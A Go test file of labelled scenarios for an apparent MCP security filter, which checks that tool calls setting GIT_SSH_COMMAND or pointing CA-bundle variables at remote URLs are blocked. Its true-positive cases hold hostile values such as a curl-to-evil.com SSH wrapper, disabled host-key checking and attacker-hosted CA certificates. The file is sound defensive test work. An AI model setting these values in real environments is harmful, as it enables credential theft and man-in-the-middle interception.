// Hand-curated MCP test scenarios for issue #2041:
// GIT_SSH_COMMAND injection and CA bundle TLS bypass via env-setter tools.
//
// Rules covered:
//   mcp-privesc-block-git-ssh-cmd-env-setter         (BLOCK name=GIT_SSH_COMMAND → any value)
//   mcp-privesc-block-git-ssh-cmd-env-setter-key-arg (BLOCK key=GIT_SSH_COMMAND)
//   mcp-privesc-block-ca-bundle-env-setter           (BLOCK name=REQUESTS_CA_BUNDLE/... → external URL)
//   mcp-privesc-block-ca-bundle-env-setter-key-arg   (BLOCK key=... companion)

package scenarios

var CABundleGitSSHScenarios2041 = []Scenario{
	// ── TP: GIT_SSH_COMMAND via 'name' arg ──────────────────────────────────────

	{
		ID:               "MCP-TP-2041-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_SSH_COMMAND", "value": "ssh -o StrictHostKeyChecking=no"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter",
		Description:      "GIT_SSH_COMMAND set to disable host key checking — allows MITM on git operations",
	},
	{
		ID:               "MCP-TP-2041-002",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "GIT_SSH_COMMAND", "value": "bash -c 'curl evil.com; ssh $@'"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter",
		Description:      "GIT_SSH_COMMAND set to exfiltrate via curl before SSH — credential theft on every git operation",
	},
	{
		ID:               "MCP-TP-2041-003",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "GIT_SSH_COMMAND", "value": "/tmp/ssh-wrapper.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter",
		Description:      "GIT_SSH_COMMAND pointing to a script in /tmp — attacker-controlled SSH wrapper",
	},

	// ── TP: GIT_SSH_COMMAND via 'key' arg ───────────────────────────────────────

	{
		ID:               "MCP-TP-2041-004",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "GIT_SSH_COMMAND", "value": "ssh -o StrictHostKeyChecking=no"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter-key-arg",
		Description:      "GIT_SSH_COMMAND via 'key' arg convention — key-arg companion rule",
	},
	{
		ID:               "MCP-TP-2041-005",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "GIT_SSH_COMMAND", "value": "/tmp/evil-ssh.sh"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter-key-arg",
		Description:      "GIT_SSH_COMMAND via 'key' arg to /tmp attacker script — key-arg companion",
	},

	// ── TP: CA bundle vars via 'name' arg ───────────────────────────────────────

	{
		ID:               "MCP-TP-2041-006",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "REQUESTS_CA_BUNDLE", "value": "http://attacker.com/evil-ca.pem"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "REQUESTS_CA_BUNDLE set to attacker CA — Python requests trusts attacker-issued certs, enabling MITM",
	},
	{
		ID:               "MCP-TP-2041-007",
		ToolName:         "set_environment",
		Arguments:        map[string]interface{}{"name": "CURL_CA_BUNDLE", "value": "https://evil.net/ca.crt"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "CURL_CA_BUNDLE set to attacker CA — all curl/libcurl connections trust attacker-issued certs",
	},
	{
		ID:               "MCP-TP-2041-008",
		ToolName:         "configure_env",
		Arguments:        map[string]interface{}{"name": "SSL_CERT_FILE", "value": "http://malicious-ca.evil.com/cert.pem"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "SSL_CERT_FILE set to attacker domain — overrides system-wide OpenSSL CA trust store",
	},
	{
		ID:               "MCP-TP-2041-009",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "NODE_EXTRA_CA_CERTS", "value": "http://attacker.com/mitm-ca.crt"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "NODE_EXTRA_CA_CERTS set to attacker CA — Node.js trusts attacker certs for all HTTPS connections",
	},

	// ── TP: CA bundle vars via 'key' arg ────────────────────────────────────────

	{
		ID:               "MCP-TP-2041-010",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "REQUESTS_CA_BUNDLE", "value": "http://attacker.com/evil-ca.pem"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter-key-arg",
		Description:      "REQUESTS_CA_BUNDLE via 'key' arg to attacker CA — key-arg companion rule",
	},
	{
		ID:               "MCP-TP-2041-011",
		ToolName:         "set_env",
		Arguments:        map[string]interface{}{"key": "CURL_CA_BUNDLE", "value": "https://evil.net/ca.crt"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter-key-arg",
		Description:      "CURL_CA_BUNDLE via 'key' arg to attacker CA — key-arg companion rule",
	},
	{
		ID:               "MCP-TP-2041-012",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"key": "SSL_CERT_FILE", "value": "http://malicious-ca.evil.com/cert.pem"},
		ExpectedDecision: "BLOCK",
		Classification:   "TP",
		Category:         "mcp-privesc-block-ca-bundle-env-setter-key-arg",
		Description:      "SSL_CERT_FILE via 'key' arg to attacker domain — key-arg companion rule",
	},

	// ── TN: benign env-setter calls ─────────────────────────────────────────────

	{
		ID:               "MCP-TN-2041-001",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_AUTHOR_NAME", "value": "Alice Developer"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter",
		Description:      "GIT_AUTHOR_NAME — benign Git identity variable, not SSH command",
	},
	{
		ID:               "MCP-TN-2041-002",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "GIT_COMMITTER_EMAIL", "value": "alice@example.com"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-git-ssh-cmd-env-setter",
		Description:      "GIT_COMMITTER_EMAIL — legitimate Git metadata variable",
	},
	{
		ID:               "MCP-TN-2041-003",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "REQUESTS_CA_BUNDLE", "value": "./certs/dev-ca.pem"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "REQUESTS_CA_BUNDLE pointing to local relative path — legitimate dev certificate setup",
	},
	{
		ID:               "MCP-TN-2041-004",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "SSL_CERT_FILE", "value": "/etc/ssl/certs/ca-certificates.crt"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "SSL_CERT_FILE pointing to system cert bundle — legitimate override to system path",
	},
	{
		ID:               "MCP-TN-2041-005",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "NODE_EXTRA_CA_CERTS", "value": "/workspace/certs/internal-ca.crt"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "NODE_EXTRA_CA_CERTS pointing to local workspace path — legitimate internal CA cert",
	},
	{
		ID:               "MCP-TN-2041-006",
		ToolName:         "set_env_var",
		Arguments:        map[string]interface{}{"name": "DATABASE_URL", "value": "http://attacker.com/db"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter",
		Description:      "DATABASE_URL with external domain — not a CA bundle var, should not trigger CA rule",
	},
	{
		ID:               "MCP-TN-2041-007",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "PORT", "value": "3000"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter-key-arg",
		Description:      "PORT set via key arg — completely benign port configuration",
	},
	{
		ID:               "MCP-TN-2041-008",
		ToolName:         "update_env",
		Arguments:        map[string]interface{}{"key": "REQUESTS_CA_BUNDLE", "value": "./certs/dev-ca.pem"},
		ExpectedDecision: "AUDIT",
		Classification:   "TN",
		Category:         "mcp-privesc-block-ca-bundle-env-setter-key-arg",
		Description:      "REQUESTS_CA_BUNDLE via key arg to local path — local cert, not external attacker CA",
	},
}
